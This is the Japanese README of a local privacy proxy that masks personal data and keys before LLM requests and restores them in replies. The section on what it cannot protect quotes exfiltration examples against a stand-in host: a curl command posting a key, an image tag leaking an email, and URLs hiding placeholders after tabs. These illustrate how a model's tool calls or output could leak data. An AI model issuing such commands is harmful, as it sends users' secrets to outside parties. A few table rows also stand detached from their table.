# redaction-proxy

[English](README.md) · [繁體中文](README.zh-TW.md) · [简体中文](README.zh-CN.md) · **日本語**

手元のマシンで動く小さなプロキシです。プロンプトがクラウドの LLM に届く前に、メールアドレス・API キー・ID 番号などの個人情報をプレースホルダーに置き換え、返ってきた応答では元の値に戻します。

![AI ツールが lin@example.test を 127.0.0.1 の redaction-proxy に送り、クラウド LLM には ⟦EMAIL_1⟧ が届きます。応答は ⟦EMAIL_1⟧ のまま戻り、プロキシが lin@example.test に復元します。](docs/media/hero.svg)

OpenAI 互換・Anthropic 互換のクライアントならストリーミングも含めてそのまま使え、ローカルモデルは不要です。個人情報や認証情報の漏えいを**減らします**が、会話を**秘密にするものではありません**。

**どちらを使うべきか**

| | このプロキシ | [dsh-privacy-router](https://github.com/PersonalAssistanceHsin/dsh-privacy-router) |
| --- | --- | --- |
| ローカルモデル | 不要 | 必要（非公開のターンに答える） |
| クラウドに届くもの | すべてのリクエスト（マスク済み） | 公開と判定したターンだけ（マスク済み）。非公開と判定したターンは手元に残る |
| 対応 | OpenAI 互換・Anthropic 互換の任意のクライアント | DeepSeek Harness（dsh）のみ |

ローカルモデルを動かせて、より強いプライバシーが必要なら、先にルーターを入れてください。ルーターは dsh-addons の redaction パッケージを通じてこのプロキシのマスク処理の中核を使います（一緒にインストールします）。動かせない場合は、このプロキシ単体でもプライバシーを一段高められます。

> **ステータス：** バージョン 0.3.0 で、npm にはまだ公開していません。実サービスでは DeepSeek の Chat Completions（2026-10-08）と、Claude Code と dsh を通した Anthropic Messages（2026-10-13）で検証済みです（下記参照）。OpenAI API と Codex CLI は未検証です。

## 30 秒クイックスタート

Node 22.19 以上（または 24 以上）と pnpm が必要です。このリポジトリをクローンしたディレクトリで実行します。

```sh
pnpm install
pnpm demo          # API キー不要：ダミー上流 + プロキシ + ストリーミングリクエスト 1 件
pnpm build
node lib/cli.js    # プロキシを http://127.0.0.1:8787 で起動
```

`pnpm demo` の出力（デモの入力は繁体字中国語です）：

```text
client sends:      請寄信給 lin.fictional@example.test，身分證 A123456789，檔案在 /Users/fictional-user/notes.md
[proxy log] POST /v1/chat/completions -> 200 masked 3 (EMAIL 1, TWID 1, PATH 1) restored 3 unknown 0 8ms
upstream received: 請寄信給 ⟦EMAIL_1⟧，身分證 ⟦TWID_1⟧，檔案在 ⟦PATH_1⟧/notes.md
client receives:   I will email lin.fictional@example.test about /Users/fictional-user/notes.md (ID A123456789).
```

### Docker

2026-10-13 に Apple Silicon の Docker Desktop 29.6.2（linux/arm64）で、ローカルのダミー上流に対して検証しました。イメージはビルドでき（347 MB、`--build-arg NAME_MODEL=1` では 864 MB）、root ではないユーザー `node` で動きます。`REDACTION_PROXY_AUTH_TOKEN` がないと起動せず、トークンのないリクエストには 401 を返します。メールアドレス、身分証番号、ホームディレクトリのパスは、OpenAI Chat Completions の JSON、ストリーミング、Anthropic Messages のいずれでもマスクされて上流に届き、応答で復元されました。許可されたオリジンからの CORS プリフライトは転送されずに 204、ほかのオリジンは 403 でした。下記の設定ファイルのマウントも動きました。未テスト：人名モデル版イメージを実際のモデルで動かすこと、linux/amd64。

```sh
docker build -t redaction-proxy .
export REDACTION_PROXY_AUTH_TOKEN=$(openssl rand -hex 32)
docker run --rm -p 127.0.0.1:8787:8787 -e REDACTION_PROXY_AUTH_TOKEN redaction-proxy
```

> **必ず `-p 127.0.0.1:8787:8787` で公開し、`-p 8787:8787` は使わないでください。** イメージはコンテナ内で `0.0.0.0` で待ち受けるため、`REDACTION_PROXY_AUTH_TOKEN` がないと起動せず、トークンのないリクエストには 401 を返します。例外は許可されたオリジンからのブラウザーの CORS プリフライトで、プロキシ自身が応答し、何も転送しません（ほかのオリジンのページには 403）。トークンは平文の HTTP で送られます。`127.0.0.1:` の接頭辞が、トークンと、ツールがプロキシを通して送る API キーをネットワークから守ります。

クライアントはトークンを `x-redaction-proxy-token` ヘッダーで送ります。Claude Code は `ANTHROPIC_CUSTOM_HEADERS="x-redaction-proxy-token: $REDACTION_PROXY_AUTH_TOKEN"`、OpenAI と Anthropic の SDK は既定ヘッダーのオプション（Python は `default_headers`、TypeScript は `defaultHeaders`）を使います。

設定ファイル `redaction.toml`（または `.json`）：`-v "$PWD/redaction.toml:/redaction.toml:ro"` を加え、末尾に `--config /redaction.toml` を付けます。人名モデル：`--build-arg NAME_MODEL=1` でビルドし、`-v ~/models/nym:/models:ro -e REDACTION_PROXY_NAME_MODEL_DIR=/models` を加えます。

上流がループバック以外の平文 `http://`（`host.docker.internal` 経由のローカルモデルサーバーなど）の場合は、`-e REDACTION_PROXY_ALLOW_INSECURE_UPSTREAM=1` も加えます。`maskLocalUsername` はコンテナのユーザー `node` をスキップするので、イメージ内では何もマスクしません。

### npx（npm への初回公開後）

まだ npm には公開していません。それまでは[クイックスタート](#30-秒クイックスタート)のとおりクローンから実行してください。2026-10-13 にローカルの tarball で検証しました。0.3.0 の `npm pack` で 198.1 kB・60 ファイルのパッケージができ、`npx --yes --package=./redaction-proxy-<version>.tgz redaction-proxy --demo` でデモの出力が表示され、`--demo` なしではプロキシが 127.0.0.1:8787 で起動します。公開後は次のとおりです。

```sh
npx redaction-proxy --demo
npx redaction-proxy           # プロキシを http://127.0.0.1:8787 で起動（ループバックではトークン不要）
```

ヘルスチェック用のエンドポイントはありません。GET リクエストは上流に中継されます。

## ツールの接続先を変える

> **実サービス：DeepSeek と Anthropic は検証済み、OpenAI は未検証です。** 2026-10-08 に[実サービス検証ツール](e2e/real/README.md)で DeepSeek に対して 4 つのシナリオ（Chat Completions、JSON とストリーミング、テキストと強制ツール呼び出し）を実行し、すべて合格しました。上流が見たのはプレースホルダーだけで、毎回 5 つの値が復元されました。2026-10-13 には 2 つの実クライアントがプロキシを通して Anthropic Messages（Claude Haiku 5.5）を使いました。
>
> - **Claude Code 2.1.287**（サブスクリプションでログイン、`ANTHROPIC_BASE_URL=http://127.0.0.1:8787`）：ストリーミングのテキストとツール（Bash、Read）。検出した値については上流が見たのはプレースホルダーだけで、応答は復元されました。ツール引数は `toolRestore` に従って `PATH`、`TERM`、`PROJECT` が復元され、ほかのカテゴリはプレースホルダーのままでした。0.3.0 より前は、ツール引数に残したプレースホルダーが後のターンで番号を振り直され、モデルが同じツールを 7 回やり直しました。0.3.0 では同じ作業がツール呼び出し 1 回、リクエスト 3 回で済みました。Claude Code は OS のユーザー名も送ります（`safeguards…user_identity` とプロジェクトディレクトリ名）。0.3.0 は既定でこれをマスクします（`maskLocalUsername`）。
> - **dsh**（DeepSeek Harness、pi-ai の Anthropic ルート経由）：テキストとツール。0.3.0 より前は、残したプレースホルダーのせいで、再送した署名付き thinking ブロックを Anthropic が HTTP 400 で拒否しました。0.3.0 で直ったことを確認済みです。
>
> 未検証：OpenAI API（キーなし）、Codex CLI（未ログイン）、Anthropic SDK の直接利用（dsh の pi-ai 経由でのみ使用）、このリポジトリの `e2e:real` 検証ツールでの Anthropic（未実行）。

<details><summary>curl の例と設定ファイル</summary>

```sh
curl http://127.0.0.1:8787/v1/chat/completions \
  -H "authorization: Bearer $OPENAI_API_KEY" \
  -H "content-type: application/json" \
  -d '{"model":"gpt-4o-mini","messages":[{"role":"user","content":"lin@example.test にメールして"}]}'
```

`node lib/cli.js --config redaction.toml` で TOML または JSON の設定ファイルを指定します（`.toml` は TOML、`.json` または拡張子なし（`/dev/stdin` など）は JSON として読み、それ以外の拡張子では起動に失敗します。項目名はどちらも同じです）。全項目と既定値は [config.example.toml](config.example.toml) にあります。環境変数はファイルより優先されます。上流の API キーはファイルに書きません。知らない項目や型の違う値（`true` の代わりの `"true"`）があると起動に失敗します。エラーメッセージが項目名や値を引用するのは、短い名前らしい語（英字・`_`・`-` で 24 文字以内、数字は 2 個まで、`sk-` や `ghp_` などの既知のトークン接頭辞で始まらない）の場合だけです。それ以外は、トークンの形をした文字列も含め、`<key>` などのプレースホルダーとして表示されます。

| 項目 | 既定値 | 説明 |
| --- | --- | --- |
| `port` | `8787` | TCP ポート。 |
| `host` | `127.0.0.1` | 待ち受けるアドレス。ループバック以外（Docker の `0.0.0.0` など）では `authToken` が必須です。 |
| `authToken` | なし | クライアントが `x-redaction-proxy-token` ヘッダーで送るトークン。16 文字以上（`openssl rand -hex 32`）。ループバックでは省略できます。Claude Code は `ANTHROPIC_CUSTOM_HEADERS="x-redaction-proxy-token: <トークン>"` で送ります。SDK は既定ヘッダーのオプションを使います。 |
| `allowedOrigins` | なし | ループバックの `http(s)` ページ以外に受け付けるブラウザーや Electron の Origin。例：`app://my-client`。`null`（`file://` のページ）は指定できません。 |
| `openaiUpstream` | `https://api.openai.com` | Chat Completions と Responses の上流。 |
| `anthropicUpstream` | `https://api.anthropic.com` | Anthropic Messages の上流。 |
| `allowInsecureUpstream` | `false` | ループバック以外の上流への平文の `http://` を許可します。API キーが平文で流れます。 |
| `redaction.terms` | なし | マスクしたい人名などの語句。大文字小文字は区別しません。先頭または末尾が英字か数字の語句は単語全体でのみ一致し（`Lin` は `Linux` に一致しません）、CJK の語句は文中でも一致します。ツールや参加者の `name` の中に単語として現れる語句（`nimbus_deploy` の `nimbus`）は、`name` がマスクされないため、それに触れるリクエストは既定では 422 で拒否されます。 |
| `redaction.projectNames` | なし | マスクしたいプロジェクトのコードネーム。 |
| `redaction.allowlist` | `git@github.com`、`noreply@github.com` | 決してマスクしない値。 |
| `redaction.rules` | `card`、`entropy` 以外すべて | 有効にする組み込みルール。`card`、`entropy` の代わりに `card-strict`、`entropy-strict` を使います。数字列を途中で切らず、ファイル名をキーにしたハッシュはマスクしません。 |
| `nameModel` | なし | [実験的な人名モデル](#オプションの人名モデル実験的)を有効にします。既定では失敗しても通します。あるリクエストでモデルが失敗すると、そのリクエストはルールだけでマスクして送り、ログの行に `nameModel failed` と出ます。`nameModel.required` が `true` なら 503 を返し、何も送りません。 |
| `screen` | `replace` | 制御文字を見える文字に置き換える（`replace`）か、リクエストを拒否する（`refuse`）か。 |
| `debugMasked` | `false` | マスク後のリクエスト本文をログに出します。プロキシがマスクしないフィールド（`metadata`、画像 URL、base64 データ）はそのまま記録されます。デバッグ専用です。 |
| `sendWhenMaskFails` | `false` | マスクに失敗しても 422 で拒否せずにリクエストを送ります。マスク後も検出した値が残る場合は一部マスクした本文を、マスクできない場合はマスクしていない本文を送ります。検出した値がプロバイダーに送られます。応答には `x-redaction-proxy-mask-failed: 1` ヘッダーが付き、ログにはフィールドとカテゴリ、またはエラーコードだけを記録し、値は記録しません。環境変数：`REDACTION_PROXY_SEND_WHEN_MASK_FAILS`（`1` または `0`）。 |
| `knownOriginalsTtlSeconds` | `86400`（24 時間） | 検出した値をクライアントの後のリクエストのために保持する秒数。最後に検出した時点から数えます。`0` なら何も保持しません。環境変数：`REDACTION_PROXY_KNOWN_ORIGINALS_TTL_SECONDS`。 |
| `maskLocalUsername` | `true` | プロキシを実行しているアカウント名（異なる場合はホームディレクトリの最後の部分も）を `terms` の 1 項目としてマスクします（`⟦TERM_n⟧`）。単独のユーザー名や `-Users-<名前>-project` のようなプロジェクトディレクトリ名は送られません。3 文字未満の名前と汎用的なアカウント名（`root`、`node`、`runner`、`user`、`admin` など）はスキップするので、Docker イメージの `node` ユーザーでは何もマスクしません。指定した語句と違い、どこに現れてもこれが理由でリクエストを拒否することはありません。名前が JSON のキー、モデル ID、ツール名の一部でもある場合（`max_tokens` の `max`、`claude`）、そこはそのまま送られます。英字や数字に続けて書かれた出現（`<名前>2024`）も単語単位の照合に合わないため、そのまま送られます。`redaction.terms` に（ASCII の大文字小文字を問わず）書いた名前は指定した語句のままで、通常どおり拒否の対象になります。環境変数：`REDACTION_PROXY_MASK_LOCAL_USERNAME`（`1` または `0`）。 |
| `toolRestore.categories` | `PATH`、`TERM`、`PROJECT` | ツール呼び出しの引数に復元するプレースホルダーのカテゴリ。ほかのカテゴリはプレースホルダーのままツールに渡り、ツールがディスクに書く内容もプレースホルダーのままです。`"*"` はすべてのカテゴリを復元します。環境変数：`REDACTION_PROXY_TOOL_RESTORE_CATEGORIES`（カンマ区切り）。 |
| `toolRestore.tools` | なし | ツール名（前後の空白を除き、大文字小文字を区別しない）ごとに、そのツールの引数に復元するカテゴリ。そのツールでは `categories` を置き換えます。例：`{"git_commit": ["PATH", "EMAIL"]}`。`"*"` はすべてのカテゴリを復元します。 |

```json
{
  "redaction": {
    "terms": ["林小明", "Denise Whitlock"],
    "projectNames": ["Nimbus"]
  }
}
```

環境変数とすべてのオプションは[技術詳細 第 12 節](docs/DETAILS.md#12-完整設定)（繁体字中国語）を参照してください。ログはリクエストごとに 1 行で、件数と所要時間を記録します。ツール呼び出しの引数にあるプレースホルダーは 1 つごとに 1 行（復元したか残したか、id、ツール、引数のパス）を記録します。`debugMasked` を有効にしない限り、元の値やヘッダーは一切含みません。

API キーを送らないクライアントには、環境変数でしか設定できない 2 つの値からプロキシがキーを補います。`REDACTION_PROXY_OPENAI_API_KEY`（OpenAI 形式のクライアントが `authorization` を送らないとき `Authorization: Bearer` として送ります）と `REDACTION_PROXY_ANTHROPIC_API_KEY`（Anthropic 形式のクライアントが `x-api-key` も `authorization` も送らないとき `x-api-key` として送ります）です。どちらもメモリにだけ保持し、これに頼るクライアントはすべて 1 つの記憶の範囲を共有します。

| 各国の国内形式、または電話を表す語の後の電話番号 | `(415) 555-0132`、`020 7946 0958`、`Telefon: 030 12345678` | `⟦PHONE_1⟧` |
| カード番号（Luhn で検証） | 13〜19 桁 | `⟦CARD_1⟧` |

| ほか 10 の国・地域の ID、IBAN | 米国 SSN、英国 NINO、中国の居民身分証、マイナンバーなど | `⟦NATID_1⟧`、`⟦IBAN_1⟧` |
| 長いランダム文字列 | 32 文字以上の hex や base64 | `⟦ENTROPY_1⟧` |
| 自分で指定した語句 | `terms`、`projectNames` | `⟦TERM_1⟧`、`⟦PROJECT_1⟧` |

同じ値はリクエスト全体で同じプレースホルダーになります。リクエスト内で検出した値がマスク後もまだ残っていれば、漏らす代わりに送信を拒否します（422）。ただし `sendWhenMaskFails` がオンのときは送ります。クライアントのリクエストで検出した値のうち ASCII 6 文字以上またはその他の文字 2 文字以上のものは、クライアントの認証情報ごとに最後に検出してから 24 時間（`knownOriginalsTtlSeconds`）メモリに保持し、検出のきっかけになった文脈（`password: …`）が履歴から消えた後のリクエストでも、単独で現れた箇所をマスクします（認証情報は ASCII の大文字小文字を区別しません）。この記憶はベストエフォートの追加マスクで、リクエストを拒否することはありません。保持した値が他の文字とくっついて現れた場合（`xTr0ub4dor&3xy`）、別の書き方の場合、プロキシが書き換えないフィールドにある場合は、そのまま送られます。自分のメッセージやシステムプロンプトで見つかった値はツール出力で見つかった値とは別に保持するので、大きなツール結果がそこに書いたパスワードを押し出すことはありません。この記憶には上限があるため、プロキシに届くローカルのプロセスは大量のリクエストで値を押し出せます。プロキシは既定でループバックだけで待ち受け、それ以外ではトークンが必須です。API のフィールド名の単語だけでできた snake_case の値（`web_server`、`data_store`）は、後のリクエストでもそのフィールド名を書けるように、バインドしたリクエストの中でだけマスクします。全角数字・`＠`・ゼロ幅文字（U+200B–U+200D、U+2060、U+FEFF、ソフトハイフン）は正規化してから照合します。値の途中にあるそれ以外の不可視文字（双方向制御文字、異体字セレクター）は正規化しません。マイナンバーは「マイナンバー」「個人番号」などのキーワードの後にある場合だけ検出します。全ルールは[技術詳細 第 3 節](docs/DETAILS.md#3-偵測規則)にあります。

## 仕組み

マスク対象ルートへの POST はすべて同じ手順を通ります。GET はマスクせずに中継します。プロキシは会話ごとのプレースホルダー対応表を持ちません。リクエストのたびに履歴全体から番号付けし直すので、追記だけで進む会話ではマスク後の先頭部分がターンごとに変わらず、クラウド側のプロンプトキャッシュもそのまま効きます。ただし、後のターン（または同じ認証情報の別のリクエスト）が、以前にすでに現れていた値を初めて検出した場合は、以前の箇所もマスクされるため、先頭部分が一度だけ変わります（[理由と崩れる場合](docs/DETAILS.md#4-遮罩順序與提示快取)）。クライアントの認証情報ごとに、長くても再起動までメモリに残るものが 2 つあります。Responses API の応答の元の入力（履歴を再送せず `previous_response_id` で続けるリクエスト用）と、下の表の記憶した値です。

![フロー図：ツールのリクエストはあなたのコンピューター上の redaction-proxy に届く。入口チェックは許可されないリクエストを拒否し（403/401/404/413）、GET はマスクせずそのまま転送する。POST はテキスト収集・スクリーニング・検出・マスクを経て、漏えい検査で検出した値が残っていれば 422 で拒否する（sendWhenMaskFails を除く）。検出した値はプレースホルダーとしてだけクラウド LLM に届く（既定）。応答の復元では、応答テキストは復元、URL の中はプレースホルダーのまま、ツール呼び出しの引数は許可カテゴリだけ復元する。](docs/media/how-it-works.ja.svg)

| 手順 | 何を決めるか | うまくいかないとき |
| --- | --- | --- |
| 入口 | Web ページからのリクエストは、送信元がループバックの `http(s)` ページか `allowedOrigins` にある場合を除き拒否。`authToken` 未設定なら、別のホスト名宛てのリクエストも拒否。既知のルートであること、`authToken` 設定時はトークンも必要。 | 403、401、404 または 413。転送しない。 |
| 検出 | 書式ルール（メール、キー、ID 番号、電話、カード番号、IP、ホスト名、ホームディレクトリのパス、長いランダム文字列）、キーワードの文脈（`password: …`）、指定した語、任意の人名モデル。 | 検出されなかった値はそのまま送られる。 |
| マスク | 同じ値はリクエスト全体で同じプレースホルダーになる。 | 本文が JSON でない、または入れ子が深すぎる場合は 400。プロキシが知らない `previous_response_id` で続けるリクエストは 422。 |
| 漏えい検査 | このリクエストで検出した値がマスク後も残っていれば、リクエスト全体を止める。列挙値らしい値を持つ API の列挙欄は検査しない。空白で単語を区切る文字では、人名と指定した語は単語全体のときだけ数える。CJK の語はどこにあっても数える。 | 422。リクエストは送られない。これは既定の動作で、`sendWhenMaskFails` をオンにするとそのまま送り、応答に印を付ける。 |
| 記憶 | 同じクライアント認証情報の以前のリクエストで検出した値も、単独で現れたときにマスク。既定で 24 時間。ベストエフォートで、リクエストを拒否することはない。 | 記憶した値が他の文字とつながっているとそのまま送られる。 |
| 復元 | 応答テキストのプレースホルダーは復元（Anthropic の署名付き `thinking` ブロックを除く）、URL の中はそのまま、ツール呼び出しの引数は `toolRestore` が許可するカテゴリだけ復元。モデルが作ったプレースホルダーは書かれたまま残る。 | ツールが必要な値の代わりにプレースホルダーを受け取ることがある。そのツールにそのカテゴリを許可すればよい。URL の中のプレースホルダーはカテゴリに関係なく残る。 |

プロキシは API キーをそのまま転送し、保存しません。キーの SHA-256 ハッシュはクライアントごとの記憶を分けるのに使います。プロキシの予備キーに頼るクライアントは 1 つの範囲を共有します。各手順の詳細（繁体字中国語）：[技術詳細 第 1 節](docs/DETAILS.md#1-架構)、[第 4 節：番号付けとプロンプトキャッシュ](docs/DETAILS.md#4-遮罩順序與提示快取)、[第 6 節：拒否](docs/DETAILS.md#6-拒絕與錯誤狀態碼)、[第 7 節：ストリーミング復元](docs/DETAILS.md#7-串流還原)、[第 8 節：記憶](docs/DETAILS.md#已知原始值)、[第 9 節：スクリーニング](docs/DETAILS.md#9-控制字元篩檢)。

## オプションの人名モデル（実験的）

既定ではオフです。ルールだけでは人名は見つかりません。小さなローカルモデル（[`Wismut/nym-pii-multilingual-small`](https://huggingface.co/Wismut/nym-pii-multilingual-small)、MIT ライセンス、108 MB）を有効にすると、**あなたが書いた文章**の中の人名・会社名・地名・住所もマスクします（`⟦NAME_1⟧`、`⟦ORG_1⟧`、`⟦LOC_1⟧`、`⟦ADDR_1⟧`）。

```sh
pnpm add -D onnxruntime-node@1.30.0 tokenizers@0.23.2   # 実行環境、約 350 MB
node scripts/fetch-name-model.mjs ~/models/nym        # 約 125 MB、sha256 を検証
REDACTION_PROXY_NAME_MODEL_DIR=$HOME/models/nym node lib/cli.js
```

見逃す人名もあり、人名でない語をマスクすることもあります。合成データでの実測値：

| | 結果 |
| --- | --- |
| 文章中の人名：英語、日本語 | 再現率 1.00、1.00 |
| 文章中の人名：繁体字中国語 | 再現率 **0.87**（8 人に 1 人ほど見逃す） |
| 貼り付けたコード・ログ・JSON 中の人名 | 再現率 0.10〜0.30：コードは読まないので、こうした人名は `terms` に入れてください |
| 適合率 | 0.94 |
| コスト | メモリ約 +420 MB、中国語の文章 2 KB あたり p95 約 130 ms |

日本語の名前の後の敬称や助詞（`さん`、`様`、`に` など）は範囲から外すので、`佐藤美咲さんに` は `⟦NAME_1⟧さんに` として送られます。読む範囲・全数値・オプションは[技術詳細 第 16 節](docs/DETAILS.md#16-人名模型實驗性)にあります。

## 保護範囲

- **守るもの：** 既定では、プロキシが検出した値はクラウドの事業者に届きません。届くのはプレースホルダーだけです（`sendWhenMaskFails` をオンにすると、マスクに失敗したリクエストは値ごと送られます）。
- **守らないもの：** 手元で値を復元した後、ツールがその値をどう使うかはプロキシの範囲外です。検出漏れはそのまま送られます。[守れないもの](#守れないもの)と[制限の全一覧](docs/DETAILS.md#17-完整限制清單)を参照してください。
- **2 段階：** リクエスト内で検出した値はそのリクエスト全体でマスクし、マスク後もまだ残っていれば既定ではリクエストを拒否します（422）。`sendWhenMaskFails` でこの拒否をオフにすると、その値ごと送ります。リクエストをまたぐ記憶はベストエフォートの追加マスクで、リクエストを拒否することはありません。保持した値が他の文字にくっついて現れたり、別の書き方で現れたりすると、そのまま送られることがあります。
- **できないこと：** マスクした値の中身が必要なタスク。たとえばメールアドレスのドメインを取り出す、キーを変換する、など。モデルには `⟦EMAIL_1⟧` しか見えません。
- **絶対にマシンの外に出してはいけない内容**は、ローカルモデルに答えさせてください。たとえば、そうしたターンを手元に残すルーター（[dsh-privacy-router](https://github.com/PersonalAssistanceHsin/dsh-privacy-router)）を使います。

## 守れないもの

- **意味。** プレースホルダーの周りはすべてクラウドに読まれます。`⟦PATH_1⟧/clients/acme-layoffs.md` でも多くが伝わります。
- **人名・住所・病状・給与**。`terms` に入れるか、人名モデルが見つけない限りそのまま送られます。住所は決まった形式もキーワードもない自由な文章なので、住所のルールはありません。
- **画像、PDF などの base64 ファイル（プレーンテキスト文書の本文はマスクします）、音声、`url` フィールド、`metadata`、`stop` シーケンス、`name` フィールド（ツール名と参加者名）、署名付きの thinking。** これらはそのまま転送され、検査もしません。JSON オブジェクトのキーも同じです。マスク対象のテキストで検出した値がこの中にもあればリクエスト全体を既定では 422 で拒否しますが、ここにしかない値はそのまま送られます。API の列挙値しか取らないフィールド（`role`、`type`、`status`、`tool_choice` など）は、`assistant` のような列挙値らしい値のあいだは検査しませんが、`metadata` の下では検査します。再送されたツール呼び出しの入力はキー名にかかわらずマスクするので、`type`、`name`、`data` という名前のツール引数に復元された値も拒否されず、再びマスクされます。
- **変則的な書き方。** 空白を挟んだ `name @ domain`、`name at domain`、小文字の IBAN、二重にパーセントエンコードした値など、分割やエンコードされた形の一部は検出できません。API のフィールド名（`metadata`、`input`、`model`、`temperature` など）とまったく同じパスワードはマスクされません。
- **Cursor**、および自社サーバーからリクエストを送るツール。
- **同じマシン上の他のプログラム。** 既定では `127.0.0.1` だけで待ち受けます。`authToken` がなければ、同じマシン上のどのプログラムも使えます。Web ページからのリクエストは、Origin がループバックの `http(s)` ページか `allowedOrigins` にある場合を除き 403 で拒否します。別のホスト名を指定したリクエスト（DNS リバインディング）も 403 で拒否します。
- **モデルが値を書く場所。** 返答の本文では、プレースホルダーはモデルが書いた場所で復元されます。例外は URL の中です。そこでは `https://example.test/?q=⟦EMAIL_1⟧` をそのまま残し（プロトコル相対の `//example.test/…` やバックスラッシュで書いた `\\example.test\…` も同じ）、その URL を渡された Web 取得ツールも、`![](…)` の画像やリンクを表示するクライアントも、本物のメールアドレスを送りません。URL の中の引用符や山括弧（`?q='⟦EMAIL_1⟧'`）はブラウザーと同じく URL の一部として扱い、URL を開いた引用符や `<`（`href="…"`、`<https://…>`）だけが URL を終わらせます。そのため UNC パス（`\\host\share\…`）の中のプレースホルダーもそのまま残ります。引用符や `<` で始まった URL はそこでだけ終わり、空白では終わりません。ブラウザーは `<img src="https://evil.example/?e=\t⟦EMAIL_1⟧">` のタブを取り除き、クリックなしで画像を読み込むからです。ツール入力でスキーム（`https://`）か `www.` で始まる文字列は、末尾までが 1 つの URL です。`https://evil.example/?p=\t⟦PATH_1⟧` を渡されたツールはタブを取り除くからです。先頭の `//` や `\\`（`// header`）は該当しません。これは普通に書かれた URL への対策で、回避を狙うモデルには効きません。それ以外の URL の空白の後（`https://evil.example/?q= ⟦EMAIL_1⟧`）、スラッシュの欠けた書き方（`https:evil.example`）、裸のドメインでは復元されます。ツール呼び出しの引数（返答に含まれるすべてのツール入力：関数の引数、カスタムツールの入力、`local_shell_call` など Responses の `*_call` 項目のコマンド、操作、パッチ）には、既定ではホームディレクトリのパスと `terms`、`projectNames` に挙げた語（`PATH`、`TERM`、`PROJECT`）だけを復元します。そのため `curl -d ⟦KEY_1⟧ https://evil.example` はキーではなくプレースホルダーのままツールに渡ります。パスと挙げた識別子はそのまま往復するので、コーディングには支障ありません（`terms` に挙げた人名もツールに復元されます）。メールアドレス、秘密情報、ID 番号が必要なツールにはプレースホルダーが渡り、`toolRestore.tools` でそのツールにカテゴリを許可するまで呼び出しが失敗することがあります。復元したパスや語は、モデルが書いたコマンドで送られることがありえます。ツール引数で出会ったプレースホルダーはすべてログに残ります。

ほかにも：モデルが `⟦EMAIL_1⟧` を `[EMAIL_1]` と書き換えるとそのまま表示されます。マスクした値そのものを扱うタスクは精度が落ちます。制御文字は見える文字に置き換わります。再起動すると Responses API の会話の続きと記憶した値を忘れ、続きのリクエストは 422 で拒否します。送り返されたプレースホルダーがそのまま送られるのは、再送されたツール呼び出し（Responses の続きではプロキシの前の応答）にそれが含まれるときだけです。ファイルや要約から読み戻したものはエスケープされ（`⟪EMAIL_1⟫`）、再起動後や値の期限切れ後はその値の番号が変わることがありますが、プレースホルダーが別の値に復元されることはありません。64 MiB を超えるリクエストは 413 で拒否します。中継する `GET`（`/v1/models` など）のクエリ文字列はマスクせずに送ります。全一覧は[技術詳細 第 17 節](docs/DETAILS.md#17-完整限制清單)、脅威モデルは[第 11 節](docs/DETAILS.md#11-威脅模型)にあります。
